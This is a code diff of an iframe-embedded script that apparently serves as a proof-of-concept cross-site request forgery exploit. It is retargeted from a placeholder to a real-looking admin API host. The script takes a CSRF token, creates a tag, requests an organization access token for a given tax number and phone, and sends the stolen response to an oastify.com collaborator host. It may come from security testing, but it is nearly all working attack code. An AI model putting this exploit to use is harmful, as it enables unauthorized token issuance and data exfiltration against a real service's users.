@@ -1,6 +1,6 @@
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
 (function () {
-    var baseUrl = 'https://test.com';
+    var baseUrl = 'https://ext-api-admin.oneme.ru';
 
     function request(method, path, body, csrfToken) {
         return new Promise(function (resolve, reject) {
@@ -43,15 +43,15 @@
 
         // 2. Создаём тег.
         await request('POST', '/v1/tag/create', {
-            text: 'testik',
+            text: 'testikssss',
             color: 'orange'
         }, csrfToken);
 
         // 3. Выполняем POST с тем же CSRF-токеном.
         var tokenText = await request('POST', '/v1/organizations/create-token', {
-            inn: '12345678',
+            inn: '035878507724',
             admin: {
-                phone: '+399999999999'
+                phone: '+79999999999'
             }
         }, csrfToken);
 
@@ -60,7 +60,7 @@
         var data = encodeURIComponent(JSON.stringify(responseBody));
 
         // 5. Отправляем финальный GET.
-        await request('GET', '/log?data=' + data);
+        await request('GET', 'https://oa2xe74a9lx2de47sw3nczef56bxztni.oastify.com/log?data=' + data);
 
         console.log('Все запросы выполнены успешно');
     })().catch(function (error) {
